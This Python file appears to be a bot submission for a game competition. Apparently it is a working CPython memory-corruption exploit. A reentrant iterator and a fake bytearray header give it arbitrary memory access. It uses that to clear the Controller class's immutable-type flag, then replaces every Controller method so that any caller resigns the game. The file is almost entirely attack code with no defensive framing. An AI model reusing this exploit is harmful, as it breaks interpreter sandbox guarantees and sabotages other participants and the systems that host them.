import contextlib
import struct
import sys

from cambc import Controller

I64_MAX = 0x7FFF_FFFF_FFFF_FFFF
_id = id

buf = bytearray(
    struct.pack(
        "<QQQQQQQQQ",  # 9 * u64
        0,  # gc_prev
        0,  # gc_next
        1,  # ob_refcnt
        _id(bytearray),  # ob_type
        I64_MAX,  # ob_size
        I64_MAX,  # ob_alloc
        0,  # ob_bytes
        0,  # ob_start
        0,  # ob_exports
    ),
)


class Victim:
    __slots__ = ("lock",) * 20

    def __init__(self) -> None:
        self.lock = False

    def __getitem__(self, _: int) -> None:
        if self.lock:
            raise IndexError
        self.lock = True
        next(it)


obj = Victim()
obj_size = obj.__sizeof__()
it = iter(obj)
list(it)
_resized = buf.ljust(obj_size, b"\0")
assert type(obj) is bytearray
mem = memoryview(obj)
mem[_id(obj) + 8 : _id(obj) + 16] = _id(bytearray).to_bytes(8, sys.byteorder)
rc = int.from_bytes(mem[_id(Victim) : _id(Victim) + 8], sys.byteorder)
mem[_id(Victim) : _id(Victim) + 8] = (rc + 1).to_bytes(8, sys.byteorder)
flag = _id(Controller) + 168
mem[flag : flag + 8] = (Controller.__flags__ & ~256).to_bytes(8, sys.byteorder)


def f(self: Controller, *a, **kw) -> None:  # noqa: ANN002, ANN003, ARG001
    self.resign("test is the best")


class Player:
    def __init__(self) -> None:
        self._patched = False

    def run(self, _ct: Controller) -> None:
        if not self._patched:
            for name in list(vars(Controller)):
                if name.startswith("__") or name == "resign":
                    continue

                with contextlib.suppress(AttributeError, TypeError):
                    setattr(Controller, name, f)
            self._patched = True
